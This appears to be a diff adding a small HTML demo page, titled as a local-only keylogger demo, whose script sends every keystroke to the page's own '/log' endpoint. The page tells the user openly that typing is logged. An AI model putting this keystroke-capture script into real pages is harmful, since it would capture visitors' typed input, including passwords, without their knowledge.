@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Keylogger Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 50px;
+        }
+        h1 {
+            color: #444;
+        }
+        textarea {
+            width: 100%;
+            height: 200px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔐 Keylogger Demo Page (Local Only)</h1>
+    <p>Start typing below. Keystrokes will be sent to the server.</p>
+    <textarea placeholder="Type here..."></textarea>
+
+    <script>
+        document.addEventListener('keydown', function(event) {
+            fetch('/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ key: event.key })
+            }).catch(err => console.error('Logging error:', err));
+        });
+    </script>
+</body>
+</html>
